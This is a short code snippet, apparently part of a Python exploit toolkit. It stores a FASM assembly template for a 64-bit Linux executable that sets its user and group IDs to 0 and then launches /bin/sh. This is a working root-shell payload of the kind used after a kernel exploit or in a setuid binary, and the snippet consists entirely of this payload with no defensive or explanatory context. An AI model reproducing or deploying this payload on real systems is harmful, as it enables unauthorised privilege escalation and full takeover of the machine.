# sh
kernel_template_fasm_sh = '''
format ELF64 executable 3
segment readable writeable
    args db '/bin/sh', 0
    argv dq args, 0
segment readable executable
entry $
    ; 设置GID为0
    xor rdi, rdi
    xor rsi, rsi
    mov eax, 106  ; setregid
    syscall
    ; 设置UID为0
    xor rdi, rdi
    xor rsi, rsi
    mov eax, 113  ; setreuid
    syscall
    ; 执行 /bin/sh
    lea rdi, [args]
    lea rsi, [argv]
    xor rax, rax
    mov al, 59    ; execve
    syscall
    ; 如果 execve 失败，退出程序
    mov eax, 60   ; exit
    xor edi, edi
    syscall
'''
